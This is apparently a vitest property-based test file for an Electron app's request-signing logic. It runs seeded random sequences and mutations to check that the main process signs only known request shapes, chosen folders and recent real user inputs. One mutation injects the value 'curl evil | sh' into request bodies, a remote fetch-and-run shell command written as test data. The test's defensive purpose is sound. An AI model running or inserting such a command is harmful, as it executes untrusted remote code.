import { generateKeyPairSync } from 'node:crypto';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { expect, it, vi } from 'vitest';
import { WITHIN_MS } from '../../../shared/words';
import { input, mayConfirm, picked, space, takeInput, wordsHeader } from '../../../main/words';
import { ownersWords } from '../../../main/device';

// Main's signed words on generated inputs (docs/contracts/signed-words.md, WORDS-1, 7, 8, 16 and 18;
// task V01-12; the skill .claude/skills/verify-signed-words): main's real functions on thousands of
// seeded cases, each carrying its expected answer from how it was built. A failure names the seed,
// the case and its steps; OBY_SEED=<seed> replays the run.

// obid and Electron's own parts, as device.test.ts stands them in: only what ownersWords reaches
const the = vi.hoisted(() => ({
  calls: [] as { path: string; words?: string }[],
  // main's own read of whether obid takes request keys, and how many of the next messages obid
  // doesn't answer at all (status 0)
  receipts: false,
  lost: 0,
}));
vi.mock('electron', () => ({
  app: { getPath: () => mkdtempSync(join(tmpdir(), 'oby-words-property-')) },
  safeStorage: { isEncryptionAvailable: () => false },
}));
vi.mock('../../../main/obid', () => ({
  HOME: '/nowhere',
  obid: async (method: string, path: string, _body?: unknown, words?: string) => {
    the.calls.push({ path, words });
    if (path === '/v1/devices') return { status: 200, text: JSON.stringify({ id: 'd1' }) };
    if (path.endsWith('/messages') && the.lost > 0) { the.lost--; return { status: 0, text: 'obid closed the connection.' }; }
    return { status: 200, text: '{}' };
  },
  takesKeys: async () => the.receipts,
}));

const SEED = process.env.OBY_SEED ? Number(process.env.OBY_SEED) : 20_261_122;
// mulberry32: a small seeded PRNG, so a seed replays every case
const random = (seed: number) => {
  let a = seed | 0;
  return () => {
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4_294_967_296;
  };
};
type Random = () => number;
const pick = <T,>(rng: Random, from: readonly T[]): T => from[Math.floor(rng() * from.length)];
const between = (rng: Random, min: number, max: number) => min + Math.floor(rng() * (max - min + 1));
// a failed answer's message: the seed, the case and its steps, the expected answer
const failure = (kase: number, steps: string[], wanted: string) =>
  `seed ${SEED}, case ${kase} (replay: OBY_SEED=${SEED}): expected ${wanted}\nsteps:\n${steps.map((s, i) => `  ${i + 1}. ${s}`).join('\n')}`;

// Property 1 (WORDS-7): sequences of the owner's inputs, Spaces, takes and Confirms
const PRESSED = ['share_status', 'share_room', 'answer_question', 'decline_remember'];
const ITEMS: { confirm?: { action: string } }[] = [...PRESSED.map((action) => ({ confirm: { action } })), { confirm: { action: 'delete_job' } }, {}];
const GAPS = [0, 1, 500, 1_999, 2_000, 2_001, 5_000];
// the latest time any sequence in this file reached: each starts WITHIN_MS past it
let latest = 1_000_000;
const drain = (at: number) => { while (takeInput(at)) { /* earlier sequences' */ } while (mayConfirm(ITEMS[0], true, at)) { /* and Spaces */ } };

type Counts = { inputs: number; spaces: number; takes: number; confirms: number };
// One sequence of 1 to 12 steps; `back`: its clock steps back once, so only the counts hold
function sequence(rng: Random, kase: number, back: boolean): { steps: string[]; counts: Counts } {
  const start = latest + WITHIN_MS;
  drain(start);
  const steps: string[] = [], counts = { inputs: 0, spaces: 0, takes: 0, confirms: 0 };
  // the model: the inputs and Spaces main saw and hasn't used, oldest first
  const inputs: number[] = [], spaces: number[] = [];
  const useOldest = (unused: number[], at: number) => {
    const i = unused.findIndex((t) => at - t < WITHIN_MS);
    if (i >= 0) unused.splice(i, 1);
    return i >= 0;
  };
  const n = between(rng, 1, 12), backAt = back ? between(rng, 0, n - 1) : -1;
  let at = start;
  for (let s = 0; s < n; s++) {
    at += pick(rng, GAPS);
    if (s === backAt) at -= between(rng, 1, 5_000);
    latest = Math.max(latest, at);
    const kind = pick(rng, ['input', 'space', 'take', 'confirm'] as const);
    let got: boolean | undefined, want: boolean | undefined;
    if (kind === 'input') { input(at); inputs.push(at); counts.inputs++; steps.push(`input(${at})`); continue; }
    if (kind === 'space') { space(at); spaces.push(at); counts.spaces++; steps.push(`space(${at})`); continue; }
    if (kind === 'take') {
      got = takeInput(at);
      want = useOldest(inputs, at);
      if (got) counts.takes++;
      steps.push(`takeInput(${at}) -> ${got}`);
    } else {
      const item = pick(rng, ITEMS), clicked = rng() < 0.5;
      const pressed = PRESSED.includes(item.confirm?.action ?? '');
      got = mayConfirm(item, clicked, at);
      want = !pressed || (clicked && (useOldest(inputs, at) || useOldest(spaces, at)));
      if (got && pressed && clicked) counts.confirms++;
      steps.push(`mayConfirm(${JSON.stringify(item)}, ${clicked}, ${at}) -> ${got}`);
    }
    if (!back && got !== want) expect(got, failure(kase, steps, `${want} at step ${s + 1}`)).toBe(want);
  }
  return { steps, counts };
}
// what holds at the end of any sequence, the clock stepped back or not: no input used twice
function used(kase: number, { steps, counts }: { steps: string[]; counts: Counts }) {
  expect(counts.takes, failure(kase, steps, `at most ${counts.inputs} true takes, one per input`)).toBeLessThanOrEqual(counts.inputs);
  expect(counts.takes + counts.confirms, failure(kase, steps, `at most ${counts.inputs + counts.spaces} uses, one per input or Space`))
    .toBeLessThanOrEqual(counts.inputs + counts.spaces);
}

it('WORDS-7: main signs at most once per real input, within 2 s, whatever the order', () => {
  const rng = random(SEED);
  for (let kase = 1; kase <= 1_500; kase++) used(kase, sequence(rng, kase, false));
});

it('WORDS-7: with the clock stepped back, no input is used twice', () => {
  const rng = random(SEED);
  for (let kase = 1; kase <= 500; kase++) used(kase, sequence(rng, kase, true));
});

// Property 2 (WORDS-1, WORDS-8, WORDS-18): each request shape the app signs, at least one for each
// branch of wordsOf that returns words. A new shape in wordsOf adds its entry here. `id`: the
// path's id, and `refused` an id its shape refuses (an empty segment unless named); `query`: false
// when a `?query` makes it unsigned; `folders`: its folders are the case's own, picked; `project`:
// main read folders for its project
type Shape = { name: string; method: string; path: string; body?: unknown; id?: string; refused?: string; query?: false; folders?: true; project?: true };
const UUID = '3f0c2a1e-1111-4222-8333-944455556666';
const SHAPES: Shape[] = [
  { name: 'words_17 the vault’s put', method: 'PUT', path: '/v1/obid/vault/staging-key', id: 'staging-key', body: { value: 'tok/secret+value' } },
  { name: 'words_17 the vault’s removal', method: 'DELETE', path: '/v1/obid/vault/staging-key', id: 'staging-key' },
  { name: 'COMPUTERSAPP-11 a computer’s removal', method: 'DELETE', path: '/v1/computers/studio', id: 'studio', refused: 'current' },
  { name: 'words_21 an artifact’s import', method: 'POST', path: '/v1/artifacts/import', body: new TextEncoder().encode('<!doctype html><h1>Mine</h1>'), query: false },
  { name: 'words_23 an artifact’s edit', method: 'POST', path: `/v1/artifacts/${UUID}/versions`, id: UUID, refused: 'c1', body: { base: 2, files: { 'style.css': 'h1 { color: crimson }' } } },
  { name: 'BROWSERAPP-9 a tab’s take', method: 'POST', path: '/v1/browser/tabs/t1/take', id: 't1', body: {} },
  { name: 'BROWSERAPP-9 a tab’s give back', method: 'POST', path: '/v1/browser/tabs/t1/giveBack', id: 't1', body: {} },
  { name: 'BROWSERAPP-18 a browser switch', method: 'PUT', path: '/v1/browser/settings', body: { agentsUseBrowser: true } },
  { name: 'BROWSERAPP-16 a download’s copy', method: 'POST', path: '/v1/browser/downloads/dl1/saveCopy', id: 'dl1', body: {} },
  { name: 'BROWSERAPP-13 an ask skipped', method: 'POST', path: '/v1/browser/asks/a1/answer', id: 'a1', body: {} },
  { name: 'BROWSERAPP-13 an ask’s choice', method: 'POST', path: '/v1/browser/asks/a1/answer', id: 'a1', body: { choice: 'Sign in' } },
  { name: 'words_14 a job’s mode', method: 'POST', path: '/v1/jobs/j1/mode', id: 'j1', body: { mode: 'plan' } },
  { name: 'words_14 the permissions mode', method: 'PUT', path: '/v1/settings/permissions', body: { mode: 'bypass' } },
  { name: 'WORDS-1 new words to Oby', method: 'POST', path: '/v1/plans', folders: true, body: { said: 'Fix the login', new: true, id: 't1', folders: [], attachments: [], jobs: ['j1'] } },
  { name: 'WORDS-1 an answer to Oby', method: 'POST', path: '/v1/plans', body: { said: 'Fix it', answer: { question: 'Which?', option: 'SQLite' }, conversation: 'c1' } },
  { name: 'ask_39 words that @-name a member', method: 'POST', path: '/v1/plans', body: { said: '@dana are you on billing?', new: true, ask: ['dana'] } },
  { name: 'words_18 words in a project', method: 'POST', path: '/v1/plans', project: true, body: { said: 'Fix the login', new: true, project: 'pr1' } },
  { name: 'words_20 a new conversation’s workspace', method: 'POST', path: '/v1/plans', folders: true, body: { said: 'Fix the login', folders: [], new: true, workspace: 'folder' } },
  { name: 'words_22 the artifact open', method: 'POST', path: '/v1/plans', body: { said: 'Make the heading red', conversation: 'c1', artifact: { id: UUID, version: 2 } } },
  { name: 'words_24 Ask to fix', method: 'POST', path: '/v1/plans', body: { said: 'The preview shows an error, in the attached file. Fix the artifact so it draws.', conversation: 'c1', id: 't1', artifact: { id: UUID, version: 2 }, attachments: ['uploads/preview-error.txt'] } },
  { name: 'COMPOSER-3 and 27 the box’s chips and skill', method: 'POST', path: '/v1/plans', body: { said: 'Review it', new: true, defaults: { mode: 'plan', agent: 'claude', model: 'opus', effort: 'high' }, skill: 'review' } },
  { name: 'WORDS-1 a message', method: 'POST', path: '/v1/jobs/j1/messages', id: 'j1', body: { text: 'and this', conversation: true } },
  { name: 'words_1 a keyed message', method: 'POST', path: '/v1/jobs/j1/messages', id: 'j1', body: { text: 'and this', attachments: ['/a'], clientRequestId: 'k1' } },
  { name: 'WORDS-10 a say in the room', method: 'POST', path: '/v1/spheres/s1/room', id: 's1', body: { text: 'Hello everyone' } },
  { name: 'words_12 a member asked', method: 'POST', path: '/v1/obid/sphere/peers/dima/ask', id: 'dima', body: { text: 'What’s the progress?' } },
  { name: 'words_19 a member’s key pinned', method: 'POST', path: '/v1/obid/sphere/pins/dima', id: 'dima', body: { fingerprint: 'ed25519:ab12cd34' } },
  { name: 'COMPUTERSAPP-6 a computer added', method: 'POST', path: '/v1/computers', body: { link: 'oby-computer:eyJuYW1lIjoiZGV2Ym94In0', code: '482913' } },
  { name: 'WORDS-13 work nobody’s watching', method: 'POST', path: '/v1/accounts/a1/background', id: 'a1', body: { given: true } },
  { name: 'WORDS-1 a title', method: 'PATCH', path: '/v1/jobs/j1', id: 'j1', body: { title: 'Mine' } },
  { name: 'WORDS-1 an inbox answer', method: 'POST', path: '/v1/inbox/i1/answer', id: 'i1', body: { answer: 'SQLite', clientRequestId: 'k2' } },
  { name: 'WORDS-1 a permission', method: 'POST', path: '/v1/jobs/j1/permission', id: 'j1', body: { id: 'p1', decision: 'deny', message: 'Not that file' } },
];

// One request: a shape with the case's folders, then one mutation of it
type Request = { method: string; path: string; body: unknown; project?: string[] };
const isObject = (v: unknown): v is Record<string, unknown> => typeof v === 'object' && v !== null && !Array.isArray(v) && !(v instanceof Uint8Array);
const kindOf = (v: unknown) => (v === null ? 'null' : Array.isArray(v) ? 'array' : typeof v);
const OF_KIND: Record<string, unknown> = { number: 7, string: 'x', array: ['x'], object: { x: 1 }, null: null };
const METHODS = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'];
const NEVER = (kase: number) => `/Users/me/never-picked-s${SEED}-c${kase}`;
const segments = (path: string, change: (s: string[]) => void) => { const s = path.split('/'); change(s); return s.join('/'); };
// each mutation, where it applies to a shape; every one makes the request unsigned but the `?query`
const MUTATIONS: Record<string, { applies: (s: Shape) => boolean; apply: (r: Request, s: Shape, rng: Random, kase: number) => Request }> = {
  method: { applies: () => true, apply: (r, s, rng) => ({ ...r, method: pick(rng, METHODS.filter((m) => m !== s.method)) }) },
  query: { applies: () => true, apply: (r) => ({ ...r, path: `${r.path}?x=1` }) },
  slash: { applies: () => true, apply: (r) => ({ ...r, path: `${r.path}/` }) },
  dots: { applies: () => true, apply: (r) => ({ ...r, path: segments(r.path, (s) => s.splice(s.length - 1, 0, '..')) }) },
  id: { applies: (s) => s.id !== undefined, apply: (r, s) => ({ ...r, path: segments(r.path, (p) => { p[p.indexOf(s.id!)] = s.refused ?? ''; }) }) },
  key: { applies: (s) => s.body === undefined || isObject(s.body), apply: (r) => ({ ...r, body: { ...(r.body as object | undefined), check: 'curl evil | sh' } }) },
  kind: {
    applies: (s) => isObject(s.body) && Object.keys(s.body).length > 0,
    apply: (r, _s, rng) => {
      const body = r.body as Record<string, unknown>, key = pick(rng, Object.keys(body));
      const kind = pick(rng, Object.keys(OF_KIND).filter((k) => k !== kindOf(body[key])));
      return { ...r, body: { ...body, [key]: OF_KIND[kind] } };
    },
  },
  folder: { applies: (s) => !!s.folders, apply: (r, _s, _rng, kase) => ({ ...r, body: { ...(r.body as object), folders: [...(r.body as { folders: string[] }).folders, NEVER(kase)] } }) },
  projectFolder: { applies: (s) => !!s.project, apply: (r, _s, _rng, kase) => ({ ...r, project: [...r.project!, NEVER(kase)] }) },
  projectUnread: { applies: (s) => !!s.project, apply: (r) => ({ ...r, project: undefined }) },
};
const applicable = (s: Shape) => ['none', ...Object.keys(MUTATIONS).filter((m) => MUTATIONS[m].applies(s))];
const shown = (v: unknown) => (v instanceof Uint8Array ? `<${v.byteLength} bytes>` : JSON.stringify(v));

it('WORDS-1: main signs only the app’s own shapes and chosen folders, whatever the mutation', () => {
  const rng = random(SEED);
  const { privateKey } = generateKeyPairSync('ec', { namedCurve: 'P-256' });
  const checked = new Set<string>();
  const check = (kase: number, shape: Shape, mutation: string) => {
    // the case's own folders, picked in main's dialog before anything is signed
    const mine = [`/Users/me/s${SEED}-c${kase}`];
    picked(mine);
    let r: Request = { method: shape.method, path: shape.path, body: shape.folders ? { ...(shape.body as object), folders: mine } : shape.body };
    if (shape.project) r.project = rng() < 0.5 ? [] : mine;
    if (mutation !== 'none') r = MUTATIONS[mutation].apply(r, shape, rng, kase);
    const want = mutation === 'none' || (mutation === 'query' && shape.query !== false);
    const got = wordsHeader(privateKey, 'd1', r.method, r.path, r.body, undefined, r.project) !== null;
    if (got !== want) {
      const step = `wordsHeader(${r.method} ${r.path}, ${shown(r.body)}, project folders read: ${shown(r.project)}) -> ${got ? 'signed' : 'null'}`;
      expect(got, failure(kase, [`${shape.name}, mutation ${mutation}`, step], want ? 'signed' : 'null')).toBe(want);
    }
    checked.add(`${shape.name} | ${mutation}`);
  };
  let kase = 0;
  for (const shape of SHAPES) for (const mutation of applicable(shape)) check(++kase, shape, mutation);
  while (kase < 2_000) {
    const shape = pick(rng, SHAPES);
    check(++kase, shape, pick(rng, applicable(shape)));
  }
  // every shape, and every mutation that applies to it, was checked
  const coverage = (wanted: string) => `seed ${SEED}, coverage of cases 1 to ${kase} (replay: OBY_SEED=${SEED}): expected ${wanted}`;
  expect(new Set(SHAPES.map((s) => s.name)).size, coverage(`${SHAPES.length} shapes, each named once: ${SHAPES.map((s) => s.name).join('; ')}`)).toBe(SHAPES.length);
  for (const shape of SHAPES) for (const mutation of applicable(shape)) {
    expect(checked.has(`${shape.name} | ${mutation}`), coverage(`shape "${shape.name}" checked with mutation ${mutation}; checked: ${[...checked].join('; ')}`)).toBe(true);
  }
});

// Property 3 (WORDS-16): sequences of the page's messages through ownersWords
const PATH = '/v1/jobs/j1/messages';
const AGAIN_MS = 10_000, AGAIN = 2;
const SEQUENCES = 1_000;
const AGAIN_GAPS = [0, 1, 500, 1_999, 2_000, 2_001, 5_000, 9_999, 10_000];

it('WORDS-16: a signature with no new input is only the same unanswered keyed request, at most twice in 10 s', async () => {
  vi.useFakeTimers({ toFake: ['Date'] });
  try {
    const rng = random(SEED);
    // the outcomes the run must reach, so it isn't vacuous
    const reached = { 'signed on an input': 0, 'signed again with no input': 0, 'refused a third time': 0, 'refused past 10 s': 0, 'refused while obid takes no keys': 0 };
    let now = Date.parse('2026-11-22T10:00:00Z');
    for (let kase = 1; kase <= SEQUENCES; kase++) {
      // past every earlier case's kept request, and no earlier input left
      vi.setSystemTime(now += AGAIN_MS);
      while (takeInput()) { /* earlier cases' */ }
      // the case's own requests: its own keys, at most 4 kept, under main's 8
      const pool = [
        { text: 'and this', clientRequestId: `${kase}-a` }, { text: 'and this', clientRequestId: `${kase}-b` },
        { text: 'and that', clientRequestId: `${kase}-a` }, { clientRequestId: `${kase}-a`, text: 'and this' }, { text: 'and this' },
      ];
      // the model: the inputs main hasn't used, and each kept request's first signature and signatures again
      const inputs: number[] = [], kept = new Map<string, { at: number; again: number }>();
      const steps: string[] = [];
      let body = pick(rng, pool);
      for (let s = 0, n = between(rng, 1, 12); s < n; s++) {
        if (s > 0 && rng() >= 0.5) body = pick(rng, pool);
        const pressed = rng() < 0.5, owners = rng() < 0.7, lost = rng() < 0.75, receipts = rng() < 0.7;
        if (pressed) { input(); inputs.push(now); }
        const request = 'clientRequestId' in body ? `POST ${PATH}\n${JSON.stringify(body)}` : null;
        const found = request === null ? undefined : kept.get(request);
        const late = !!found && now - found.at >= AGAIN_MS, twice = !!found && !late && found.again >= AGAIN;
        const live = found && !late && !twice ? found : undefined;
        if (live) live.again++;
        let want = !!live && receipts, onInput = false;
        if (!want && owners) {
          const i = inputs.findIndex((t) => now - t < WITHIN_MS);
          onInput = want = i >= 0;
          if (onInput) inputs.splice(i, 1);
        }
        the.receipts = receipts;
        the.lost = lost ? 1 : 0;
        await ownersWords('POST', PATH, body, owners);
        the.lost = 0;
        const got = /^d1 /.test(the.calls.at(-1)?.words ?? '');
        steps.push(`${pressed ? 'input(); ' : ''}at ${now}, takesKeys ${receipts}: ownersWords(POST ${PATH}, ${JSON.stringify(body)}, ${owners}) -> ${got ? 'signed' : 'unsigned'}, status ${lost ? 0 : 200}`);
        if (got !== want) expect(got, failure(kase, steps, `${want ? 'signed' : 'unsigned'} at step ${s + 1}`)).toBe(want);
        if (onInput) reached['signed on an input']++;
        if (live && receipts) reached['signed again with no input']++;
        if (!want && twice) reached['refused a third time']++;
        if (!want && late) reached['refused past 10 s']++;
        if (!want && live && !receipts) reached['refused while obid takes no keys']++;
        if (!lost) { if (live) kept.delete(request!); } else if (onInput && request !== null && !live) kept.set(request, { at: now, again: 0 });
        vi.setSystemTime(now += pick(rng, AGAIN_GAPS));
      }
    }
    for (const [outcome, times] of Object.entries(reached)) {
      expect(times, `seed ${SEED}, outcomes of cases 1 to ${SEQUENCES} (replay: OBY_SEED=${SEED}): expected "${outcome}" at least 10 times; reached: ${JSON.stringify(reached)}`).toBeGreaterThanOrEqual(10);
    }
  } finally {
    vi.useRealTimers();
    the.receipts = false;
  }
});
